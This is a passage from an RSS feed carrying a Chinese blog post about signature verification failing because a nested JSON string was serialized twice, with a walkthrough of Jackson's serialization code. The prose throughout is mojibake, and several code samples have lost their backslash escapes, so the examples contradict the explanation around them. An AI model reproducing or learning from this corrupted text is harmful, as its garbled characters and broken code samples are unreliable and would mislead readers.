#b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘åœ¨å¼€å‘è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸€ä¸ªçš„æŒºæœ‰æ„æ€çš„éªŒç­¾é—®é¢˜ã€‚æˆ‘ä»¬çš„é¡¹ç›®é‡‡ç”¨äº†å‰åç«¯ç­¾åéªŒè¯æœºåˆ¶æ¥ä¿è¯æ•°æ®å®‰å…¨ï¼š</p>
<ul>
<li><strong>å‰ç«¯</strong>ï¼šè¯·æ±‚æ—¶å¯¹ body è¿›è¡Œç­¾å</li>
<li><strong>åç«¯</strong>ï¼šæ¥æ”¶åå¯¹ body è¿›è¡ŒéªŒç­¾</li>
</ul>
<p>æ­£å¸¸æƒ…å†µä¸‹éƒ½æ²¡å•¥é—®é¢˜ï¼Œä½†è¿™æ¬¡æ¯”è¾ƒå¥‡æ€ªï¼š</p>
<ol>
<li>åç«¯æ¥å£ A è¿”å›äº†ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­æŸä¸ªå­—æ®µæ˜¯ <strong>JSON å­—ç¬¦ä¸²</strong>ï¼ˆString ç±»å‹ï¼‰</li>
<li>å‰ç«¯æ‹¿åˆ°è¿™ä¸ªå¯¹è±¡åï¼Œä¼šæŠŠè¿™ä¸ªjsonå­—ç¬¦ä¸²åŸæ¨¡åŸæ ·çš„ä½œä¸ºå‚æ•°ä¼ ç»™åç«¯æ¥å£ B</li>
<li>ç„¶åå°±ã€‚ã€‚ã€‚éªŒç­¾å¤±è´¥äº†</li>
</ol>
<p>æˆ‘ä»¬å°±é™·å…¥äº†äº’ç›¸ç”©é”…çš„å±€é¢ï¼š</p>
<ul>
<li><strong>åç«¯</strong>è®¤ä¸ºï¼šå‰ç«¯éªŒç­¾æ—¶åšäº†ç‰¹æ®Šå¤„ç†</li>
<li><strong>å‰ç«¯</strong>å¾ˆæ— è¾œï¼šç”¨çš„æ˜¯å…¬å…±åº“ï¼Œä»æ²¡æ”¹è¿‡</li>
<li><strong>æŠ˜ä¸­å…±è¯†</strong>ï¼šå¯èƒ½æ˜¯ HTTP ä¼ è¾“è¿‡ç¨‹ä¸­å¯¹ JSON åšäº†è½¬ä¹‰</li>
</ul>
<p>ç»è¿‡ä¸€ç•ªè°ƒè¯•å‘ç°ï¼š</p>
<ul>
<li>å‰ç«¯éªŒç­¾æ—¶ï¼ŒJSON å­—ç¬¦ä¸²å­—æ®µæœ‰<strong>ä¸€æ¬¡è½¬ä¹‰å­—ç¬¦</strong>ï¼ˆå¦‚ <code>"</code>)</li>
<li>åç«¯æ”¶åˆ°çš„ body ä¸­ï¼ŒJSON å­—ç¬¦ä¸²å­—æ®µæœ‰<strong>äºŒæ¬¡è½¬ä¹‰å­—ç¬¦</strong>ï¼ˆå¦‚ <code>\"</code>)</li>
</ul>
<p>åŒæ–¹éªŒç­¾çš„æ•°æ®ä¸ä¸€è‡´ï¼Œè‡ªç„¶éªŒè¯å¤±è´¥ã€‚</p>
<p>ä¸´æ—¶æ–¹æ¡ˆï¼šå¯¹è¿™ä¸ªå­—æ®µåš Base64 ç¼–ç ï¼Œç»•è¿‡è½¬ä¹‰é—®é¢˜ã€‚</p>
<p>ä½†äº‹å®çœŸçš„æ˜¯ HTTP ä¼ è¾“å¯¼è‡´çš„è½¬ä¹‰å—ï¼Ÿ<strong>å½“ç„¶ä¸æ˜¯</strong></p>
<p><strong>HTTP è¯·æ±‚æœ¬èº«ä¸ä¼šå¯¹æ•°æ®è¿›è¡Œè½¬ä¹‰</strong>ã€‚é‚£è½¬ä¹‰å­—ç¬¦æ˜¯ä»å“ªé‡Œæ¥çš„ï¼Ÿ</p>
<h3 data-id="heading-0">é—®é¢˜æ ¹æº</h3>
<p>æ•´ä¸ªæµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p>
<h4 data-id="heading-1">ç¬¬ä¸€æ­¥ï¼šåç«¯æ¥å£ A è¿”å›æ•°æ®ï¼ˆç¬¬ä¸€æ¬¡åºåˆ—åŒ–ï¼‰</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//Â åç«¯è¿”å›çš„å¯¹è±¡</span>
<span class="hljs-keyword">public</span>Â <span class="hljs-keyword">class</span>Â <span class="hljs-title class_">Response</span>Â {
Â Â Â Â <span class="hljs-keyword">private</span>Â StringÂ <span class="hljs-keyword">data</span>;Â Â <span class="hljs-comment">//Â è¿™é‡Œå­˜å‚¨çš„æ˜¯Â JSONÂ å­—ç¬¦ä¸²</span>
}

<span class="hljs-comment">//Â æ¥å£Â AÂ è¿”å›æ•°æ®</span>
<span class="hljs-keyword">return</span>Â newÂ Response(<span class="hljs-string">"{"</span>name<span class="hljs-string">":"</span>å¼ ä¸‰<span class="hljs-string">","</span>age<span class="hljs-string">":25}"</span>);
</code></pre>
<p>Spring Boot åœ¨å“åº”æ—¶ä¼šè‡ªåŠ¨è¿›è¡Œ JSON åºåˆ—åŒ–ï¼Œç”±äº <code>data</code> å­—æ®µæœ¬èº«æ˜¯å­—ç¬¦ä¸²ï¼Œä¼šå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
Â Â <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"{"</span>name<span class="hljs-string">":"</span>å¼ ä¸‰<span class="hljs-string">","</span>age<span class="hljs-string">":25}"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-2">ç¬¬äºŒæ­¥ï¼šå‰ç«¯éªŒç­¾ï¼ˆåŸºäºä¸€æ¬¡è½¬ä¹‰çš„æ•°æ®ï¼‰</h4>
<p>å‰ç«¯æ‹¿åˆ°å“åº”åï¼Œå¯¹æ•´ä¸ªå¯¹è±¡è¿›è¡ŒéªŒç­¾ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">//Â å‰ç«¯æ”¶åˆ°çš„æ•°æ®</span>
<span class="hljs-keyword">const</span>Â responseÂ =Â {
Â Â <span class="hljs-attr">data</span>:Â <span class="hljs-string">"{"</span>name<span class="hljs-string">":"</span>å¼ ä¸‰<span class="hljs-string">","</span>age<span class="hljs-string">":25}"</span>Â Â <span class="hljs-comment">//Â å¸¦æœ‰ä¸€æ¬¡è½¬ä¹‰</span>
};

<span class="hljs-comment">//Â å¯¹è¿™ä¸ªå¯¹è±¡åšéªŒç­¾</span>
<span class="hljs-keyword">const</span>Â signatureÂ =Â <span class="hljs-title function_">sign</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(response));
</code></pre>
<p>æ­¤æ—¶éªŒç­¾çš„åŸå§‹æ•°æ®åŒ…å«<strong>ä¸€æ¬¡è½¬ä¹‰å­—ç¬¦</strong>ã€‚</p>
<h4 data-id="heading-3">ç¬¬ä¸‰æ­¥ï¼šå‰ç«¯è¯·æ±‚æ¥å£ Bï¼ˆç¬¬äºŒæ¬¡åºåˆ—åŒ–ï¼‰</h4>
<p>å‰ç«¯å°†è¿™ä¸ªå¯¹è±¡ä½œä¸º body è¯·æ±‚æ¥å£ Bï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">//Â å°†å¯¹è±¡å‘é€ç»™æ¥å£Â B</span>
axios.<span class="hljs-built_in">post</span>(<span class="hljs-string">'/api/b'</span>,Â response);
</code></pre>
<p>æµè§ˆå™¨æˆ– HTTP åº“ä¼šå†æ¬¡å¯¹ body è¿›è¡Œ JSON åºåˆ—åŒ–ï¼ŒJSON å­—ç¬¦ä¸²åˆä¼šè¢«è½¬ä¹‰ä¸€æ¬¡ï¼š</p>
<pre><code class="hljs language-swift" lang="swift">{
Â Â <span class="hljs-string">"data"</span>:Â <span class="hljs-string">"{<span class="hljs-subst">\"</span>name<span class="hljs-subst">\"</span>:<span class="hljs-subst">\"</span>å¼ ä¸‰<span class="hljs-subst">\"</span>,<span class="hljs-subst">\"</span>age<span class="hljs-subst">\"</span>:25}"</span>
}
</code></pre>
<p>æ³¨æ„ï¼š<code>"</code> å˜æˆäº† <code>\"</code>ï¼ˆäºŒæ¬¡è½¬ä¹‰ï¼‰</p>
<h4 data-id="heading-4">ç¬¬å››æ­¥ï¼šåç«¯æ¥å£ B éªŒç­¾ï¼ˆåŸºäºäºŒæ¬¡è½¬ä¹‰çš„æ•°æ®ï¼‰</h4>
<p>åç«¯æ”¶åˆ°è¯·æ±‚åï¼Œæ‹¿åˆ°çš„æ˜¯ç»è¿‡<strong>äºŒæ¬¡è½¬ä¹‰</strong>çš„æ•°æ®è¿›è¡ŒéªŒç­¾ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//Â åç«¯æ”¶åˆ°çš„Â bodyï¼ˆäºŒæ¬¡è½¬ä¹‰ï¼‰</span>
<span class="hljs-type">String</span>Â bodyÂ <span class="hljs-operator">=</span>Â <span class="hljs-string">"{<span class="hljs-subst">\"</span>name<span class="hljs-subst">\"</span>:<span class="hljs-subst">\"</span>å¼ ä¸‰<span class="hljs-subst">\"</span>,<span class="hljs-subst">\"</span>age<span class="hljs-subst">\"</span>:25}"</span>;

<span class="hljs-comment">//Â éªŒç­¾å¤±è´¥ï¼å› ä¸ºè½¬ä¹‰å­—ç¬¦æ•°é‡ä¸ä¸€è‡´</span>
</code></pre>
<h3 data-id="heading-5">ä¸ºä»€ä¹ˆéªŒç­¾ä¼šå¤±è´¥ï¼Ÿ</h3>
<ul>
<li><strong>å‰ç«¯éªŒç­¾</strong>ï¼šåŸºäºä¸€æ¬¡è½¬ä¹‰çš„æ•°æ® <code>{"name":...}</code></li>
<li><strong>åç«¯éªŒç­¾</strong>ï¼šåŸºäºäºŒæ¬¡è½¬ä¹‰çš„æ•°æ® <code>{\"name\":...}</code></li>
</ul>
<p>ä¸¤è¾¹è®¡ç®—ç­¾åçš„åŸå§‹æ•°æ®ä¸ä¸€è‡´ï¼Œè‡ªç„¶å°±éªŒç­¾å¤±è´¥äº†</p>
<h2 data-id="heading-6">æœ€å¿«çš„æ–¹æ¡ˆ</h2>
<p><strong>ä¸è¦åœ¨å¯¹è±¡ä¸­åµŒå¥— JSON å­—ç¬¦ä¸²ï¼Œç›´æ¥è¿”å› JSON å¯¹è±¡</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//Â é”™è¯¯åšæ³•</span>
<span class="hljs-keyword">public</span>Â <span class="hljs-keyword">class</span>Â <span class="hljs-title class_">Response</span>Â {
Â Â Â Â <span class="hljs-keyword">private</span>Â StringÂ <span class="hljs-keyword">data</span>;Â Â <span class="hljs-comment">//Â JSONÂ å­—ç¬¦ä¸²</span>
}

<span class="hljs-comment">//Â æ­£ç¡®åšæ³•</span>
<span class="hljs-keyword">public</span>Â <span class="hljs-keyword">class</span>Â <span class="hljs-title class_">Response</span>Â {
Â Â Â Â <span class="hljs-keyword">private</span>Â UserInfoÂ <span class="hljs-keyword">data</span>;Â Â <span class="hljs-comment">//Â JSONÂ å¯¹è±¡</span>
}

<span class="hljs-keyword">public</span>Â <span class="hljs-keyword">class</span>Â <span class="hljs-title class_">UserInfo</span>Â {
Â Â Â Â <span class="hljs-keyword">private</span>Â StringÂ name;
Â Â Â Â <span class="hljs-keyword">private</span>Â IntegerÂ age;
}
</code></pre>
<p>è¿™æ · Spring Boot åªä¼šè¿›è¡Œä¸€æ¬¡åºåˆ—åŒ–ï¼Œä¸ä¼šäº§ç”Ÿè½¬ä¹‰å­—ç¬¦ï¼Œå‰åç«¯å¤„ç†çš„æ•°æ®æ ¼å¼å®Œå…¨ä¸€è‡´ã€‚</p>
<h2 data-id="heading-7">çŸ¥å·±çŸ¥å½¼</h2>
<p>æ—¢ç„¶æ‰¾åˆ°äº†é—®é¢˜æ ¹æºï¼Œæ­£å¥½å°±æ·±å…¥æºç çœ‹çœ‹ Jackson æ˜¯å¦‚ä½•å¯¹å­—ç¬¦ä¸²è¿›è¡Œåºåˆ—åŒ–çš„ã€‚Spring Boot é»˜è®¤ä½¿ç”¨ Jackson ä½œä¸º JSON åºåˆ—åŒ–æ¡†æ¶ã€‚</p>
<h3 data-id="heading-8">åºåˆ—åŒ–è°ƒç”¨é“¾è·¯</h3>
<h4 data-id="heading-9">1. BeanSerializerBase - å¯¹è±¡åºåˆ—åŒ–å…¥å£</h4>
<p>åºåˆ—åŒ–ä¸€èˆ¬ä¼šè°ƒç”¨ <code>BeanSerializer</code>ï¼Œå…¶æ ¸å¿ƒå®ç°åœ¨ <code>BeanSerializerBase</code> ä¸­ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">protectedÂ voidÂ serializeFields(ObjectÂ bean,Â JsonGeneratorÂ gen,Â SerializerProviderÂ provider)
Â Â Â Â Â Â Â Â throwsÂ IOExceptionÂ {
Â Â Â Â finalÂ BeanPropertyWriter<span class="hljs-section">[]</span>Â props<span class="hljs-comment">;Â Â //Â å¯¹è±¡çš„æ‰€æœ‰å­—æ®µå±æ€§</span>
Â Â Â Â ifÂ (_filteredPropsÂ !=Â nullÂ &amp;&amp;Â provider.getActiveView()Â !=Â null)Â {
Â Â Â Â Â Â Â Â <span class="hljs-attr">props</span>Â =Â _filteredProps<span class="hljs-comment">;</span>
Â Â Â Â }Â elseÂ {
Â Â Â Â Â Â Â Â <span class="hljs-attr">props</span>Â =Â _props<span class="hljs-comment">;</span>
Â Â Â Â }

Â Â Â Â intÂ <span class="hljs-attr">i</span>Â =Â <span class="hljs-number">0</span><span class="hljs-comment">;</span>
Â Â Â Â tryÂ {
Â Â Â Â Â Â Â Â //Â éå†æ‰€æœ‰å­—æ®µè¿›è¡Œåºåˆ—åŒ–
Â Â Â Â Â Â Â Â forÂ (finalÂ intÂ <span class="hljs-attr">len</span>Â =Â props.length<span class="hljs-comment">;Â iÂ &lt;Â len;Â ++i)Â {</span>
Â Â Â Â Â Â Â Â Â Â Â Â BeanPropertyWriterÂ <span class="hljs-attr">prop</span>Â =Â props[i]<span class="hljs-comment">;</span>
Â Â Â Â Â Â Â Â Â Â Â Â ifÂ (propÂ !=Â null)Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â prop.serializeAsField(bean,Â gen,Â provider)<span class="hljs-comment">;Â Â //Â å…³é”®è°ƒç”¨</span>
Â Â Â Â Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â //Â ...Â çœç•¥å…¶ä»–ä»£ç 
Â Â Â Â }
}
</code></pre>
<h4 data-id="heading-10">2. BeanPropertyWriter - å­—æ®µåºåˆ—åŒ–å¤„ç†</h4>
<p>æ¯ä¸ªå­—æ®µä¼šè°ƒç”¨ <code>serializeAsField</code> æ–¹æ³•ï¼Œæ ¹æ®å­—æ®µç±»å‹é€‰æ‹©å¯¹åº”çš„åºåˆ—åŒ–å™¨ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">publicÂ voidÂ serializeAsField(ObjectÂ bean,Â JsonGeneratorÂ gen,Â SerializerProviderÂ prov)
Â Â Â Â Â Â Â Â throwsÂ ExceptionÂ {
Â Â Â Â //Â è·å–å­—æ®µå€¼
Â Â Â Â finalÂ ObjectÂ <span class="hljs-attr">value</span>Â =Â (_accessorMethodÂ ==Â null)
Â Â Â Â Â Â Â Â ?Â _field.get(bean)
Â Â Â Â Â Â Â Â :Â _accessorMethod.invoke(bean,Â (Object<span class="hljs-section">[]</span>)Â null)<span class="hljs-comment">;</span>

Â Â Â Â //Â å¤„ç†Â nullÂ å€¼
Â Â Â Â ifÂ (<span class="hljs-attr">value</span>Â ==Â null)Â {
Â Â Â Â Â Â Â Â ifÂ (_nullSerializerÂ !=Â null)Â {
Â Â Â Â Â Â Â Â Â Â Â Â gen.writeFieldName(_name)<span class="hljs-comment">;</span>
Â Â Â Â Â Â Â Â Â Â Â Â _nullSerializer.serialize(null,Â gen,Â prov)<span class="hljs-comment">;</span>
Â Â Â Â Â Â Â Â }
Â Â Â Â Â Â Â Â return<span class="hljs-comment">;</span>
Â Â Â Â }

Â Â Â Â //Â è·å–åºåˆ—åŒ–å™¨ï¼ˆå…³é”®ï¼šæ ¹æ®å­—æ®µç±»å‹é€‰æ‹©ä¸åŒçš„åºåˆ—åŒ–å™¨ï¼‰
Â Â Â Â JsonSerializer&lt;Object&gt;Â <span class="hljs-attr">ser</span>Â =Â _serializer<span class="hljs-comment">;</span>
Â Â Â Â ifÂ (<span class="hljs-attr">ser</span>Â ==Â null)Â {
Â Â Â Â Â Â Â Â Class&lt;?&gt;Â <span class="hljs-attr">cls</span>Â =Â value.getClass()<span class="hljs-comment">;</span>
Â Â Â Â Â Â Â Â PropertySerializerMapÂ <span class="hljs-attr">m</span>Â =Â _dynamicSerializers<span class="hljs-comment">;</span>
Â Â Â Â Â Â Â Â <span class="hljs-attr">ser</span>Â =Â m.serializerFor(cls)<span class="hljs-comment">;Â Â //Â StringÂ ç±»å‹ä¼šè¿”å›Â StringSerializer</span>
Â Â Â Â Â Â Â Â ifÂ (<span class="hljs-attr">ser</span>Â ==Â null)Â {
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-attr">ser</span>Â =Â _findAndAddDynamic(m,Â cls,Â prov)<span class="hljs-comment">;</span>
Â Â Â Â Â Â Â Â }
Â Â Â Â }

Â Â Â Â //Â å†™å…¥å­—æ®µåå’Œå€¼
Â Â Â Â gen.writeFieldName(_name)<span class="hljs-comment">;</span>
Â Â Â Â ser.serialize(value,Â gen,Â prov)<span class="hljs-comment">;Â Â //Â è°ƒç”¨å…·ä½“çš„åºåˆ—åŒ–å™¨</span>
}
</code></pre>
<p><strong>æ ¸å¿ƒè¦ç‚¹</strong>ï¼š</p>
<ul>
<li>å¦‚æœå­—æ®µæ˜¯å¯¹è±¡ï¼Œä¼šé€’å½’è°ƒç”¨ <code>BeanSerializer</code></li>
<li>å¦‚æœå­—æ®µæ˜¯å­—ç¬¦ä¸²ï¼Œä¼šè°ƒç”¨ <code>StringSerializer</code></li>
</ul>
<h4 data-id="heading-11">3. StringSerializer</h4>
<p>å½“å­—æ®µç±»å‹æ˜¯ <code>String</code> æ—¶ï¼Œä½¿ç”¨ <code>StringSerializer</code> è¿›è¡Œåºåˆ—åŒ–ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span>Â <span class="hljs-keyword">void</span>Â <span class="hljs-title function_">serialize</span><span class="hljs-params">(ObjectÂ value,Â JsonGeneratorÂ gen,Â SerializerProviderÂ provider)</span>
Â Â Â Â Â Â Â Â <span class="hljs-keyword">throws</span>Â IOExceptionÂ {
Â Â Â Â gen.writeString((String)Â value);Â Â <span class="hljs-comment">//Â è°ƒç”¨Â JsonGeneratorÂ å†™å…¥å­—ç¬¦ä¸²</span>
}
</code></pre>
<h4 data-id="heading-12">4. UTF8JsonGenerator</h4>
<p>ç”±äºé»˜è®¤ä½¿ç”¨ UTF-8 ç¼–ç ï¼Œæœ€ç»ˆä¼šè°ƒç”¨ <code>UTF8JsonGenerator.writeString</code> æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span>Â voidÂ writeString(StringÂ text)Â throwsÂ IOExceptionÂ {
Â Â Â Â <span class="hljs-keyword">this</span>._verifyValueWrite(<span class="hljs-string">"writeÂ aÂ string"</span>);
Â Â Â Â <span class="hljs-keyword">if</span>Â (textÂ ==Â <span class="hljs-literal">null</span>)Â {
Â Â Â Â Â Â Â Â <span class="hljs-keyword">this</span>._writeNull();
Â Â Â Â }Â <span class="hljs-keyword">else</span>Â {
Â Â Â Â Â Â Â Â intÂ lenÂ =Â text.length();
Â Â Â Â Â Â Â Â <span class="hljs-keyword">if</span>Â (lenÂ &gt;Â <span class="hljs-keyword">this</span>._outputMaxContiguous)Â {
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">this</span>._writeStringSegments(text,Â <span class="hljs-literal">true</span>);
Â Â Â Â Â Â Â Â }Â <span class="hljs-keyword">else</span>Â {
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">if</span>Â (<span class="hljs-keyword">this</span>._outputTailÂ +Â lenÂ &gt;=Â <span class="hljs-keyword">this</span>._outputEnd)Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">this</span>._flushBuffer();
Â Â Â Â Â Â Â Â Â Â Â Â }

Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â æ·»åŠ å¼€å§‹å¼•å·</span>
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">this</span>._outputBuffer[<span class="hljs-keyword">this</span>._outputTail++]Â =Â <span class="hljs-keyword">this</span>._quoteChar;

Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â å†™å…¥å­—ç¬¦ä¸²å†…å®¹ï¼ˆè¿™é‡Œä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼ï¼‰</span>
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">this</span>._writeStringSegment((String)text,Â <span class="hljs-number">0</span>,Â len);

Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">if</span>Â (<span class="hljs-keyword">this</span>._outputTailÂ &gt;=Â <span class="hljs-keyword">this</span>._outputEnd)Â {
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">this</span>._flushBuffer();
Â Â Â Â Â Â Â Â Â Â Â Â }

Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â æ·»åŠ ç»“æŸå¼•å·</span>
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">this</span>._outputBuffer[<span class="hljs-keyword">this</span>._outputTail++]Â =Â <span class="hljs-keyword">this</span>._quoteChar;
Â Â Â Â Â Â Â Â }
Â Â Â Â }
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š<code>_writeStringSegment</code> æ–¹æ³•ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ <code>"</code>ã€``ã€æ¢è¡Œç¬¦ç­‰ï¼‰è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚</p>
<h3 data-id="heading-13">è½¬ä¹‰ç¤ºä¾‹å¯¹æ¯”</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b702a100de444dfaa7164c85df8612e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgOeWPt-i-vuS6ug==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766204792&amp;x-signature=UNxR7zkOHVHIvq4YSqd7j9C4Siw%3D" alt="" loading="lazy"/> åºåˆ—åŒ–ä¹‹åå°±å¤šäº†ä¸€å±‚è½¬ä¹‰ç¬¦å·</p>
<h3 data-id="heading-14">ä¸»è¦çš„è°ƒç”¨é“¾è·¯</h3>
<pre><code class="hljs language-scss" lang="scss">å¯¹è±¡åºåˆ—åŒ–
Â Â â†“
BeanSerializerBase<span class="hljs-selector-class">.serializeFields</span>()Â Â <span class="hljs-comment">//Â éå†å¯¹è±¡å­—æ®µ</span>
Â Â â†“
BeanPropertyWriter<span class="hljs-selector-class">.serializeAsField</span>()Â Â <span class="hljs-comment">//Â å¤„ç†å•ä¸ªå­—æ®µ</span>
Â Â â†“
StringSerializer<span class="hljs-selector-class">.serialize</span>()Â Â <span class="hljs-comment">//Â StringÂ ç±»å‹èµ°è¿™é‡Œ</span>
Â Â â†“
UTF8JsonGenerator<span class="hljs-selector-class">.writeString</span>()Â Â <span class="hljs-comment">//Â æ‰§è¡Œè½¬ä¹‰</span>
Â Â â†“
<span class="hljs-built_in">_writeStringSegment</span>()Â Â <span class="hljs-comment">//Â è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ï¼ˆ"Â â†’Â "ï¼‰</span>
</code></pre>
<p>ç†è§£äº†è¿™ä¸ªè°ƒç”¨é“¾è·¯ï¼Œå°±èƒ½æ˜ç™½ä¸ºä»€ä¹ˆ JSON å­—ç¬¦ä¸²åœ¨åºåˆ—åŒ–æ—¶ä¼šäº§ç”Ÿè½¬ä¹‰å­—ç¬¦ï¼Œä»¥åŠä¸ºä»€ä¹ˆå¤šæ¬¡åºåˆ—åŒ–ä¼šå¯¼è‡´å¤šå±‚è½¬ä¹‰ã€‚</p>
<h2 data-id="heading-15">æ€»ç»“</h2>
<ol>
<li><strong>å°½é‡é¿å…åœ¨å¯¹è±¡ä¸­åµŒå¥— JSON å­—ç¬¦ä¸²</strong>ï¼Œåº”è¯¥ä½¿ç”¨å¼ºç±»å‹å¯¹è±¡ï¼Œé¿å…å¤šæ¬¡åºåˆ—åŒ–å¸¦æ¥çš„è½¬ä¹‰é—®é¢˜</li>
<li><strong>HTTP ä¼ è¾“ä¸ä¼šç¯¡æ”¹æ•°æ®</strong>ï¼Œé—®é¢˜å¾€å¾€å‡ºåœ¨åºåˆ—åŒ–/ååºåˆ—åŒ–ç¯èŠ‚</li>
<li><strong>ç†è§£åºåˆ—åŒ–çš„æœ¬è´¨</strong>ï¼šæ¯åºåˆ—åŒ–ä¸€æ¬¡ï¼ŒJSON å­—ç¬¦ä¸²å°±ä¼šå¤šä¸€å±‚è½¬ä¹‰</li>
<li><strong>é‡åˆ°éªŒç­¾é—®é¢˜</strong>ï¼Œä¼˜å…ˆæ£€æŸ¥åŒæ–¹å¤„ç†æ•°æ®æ—¶ç»å†äº†å‡ æ¬¡åºåˆ—åŒ–</li>
</ol>
<p>éªŒç­¾è™½ç„¶å¥½ï¼Œä½†æœ‰æ—¶å€™ä¹ŸæŒºéº»çƒ¦çš„ã€‚æ‰€ä»¥ç†è§£æ•°æ®åœ¨å‰åç«¯ä¹‹é—´çš„æµè½¬è¿‡ç¨‹å’Œåºåˆ—åŒ–æ—¶æœºï¼Œå¯ä»¥æ›´å¥½é¿å…è¿™æ ·çš„éªŒç­¾é—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å¸¸ç”¨æ¨¡å¼ï¼šæå‡ä»£ç è´¨é‡çš„å››å¤§æ ¸å¿ƒæ¨¡å¼]]></title>    <link>https://juejin.cn/post/7583139562735190059</link>    <guid>https://juejin.cn/post/7583139562735190059</guid>    <pubDate>2025-12-13T05:00:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583139562735190059" data-draft-id="7582787460419321898" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å¸¸ç”¨æ¨¡å¼ï¼šæå‡ä»£ç è´¨é‡çš„å››å¤§æ ¸å¿ƒæ¨¡å¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,è®¾è®¡æ¨¡å¼"/> <meta itemprop="datePublished" content="2025-12-13T05:00:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="1024è‚¥å®…"/> <meta itemprop="url" content="https://juejin.cn/user/588993964030574"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" 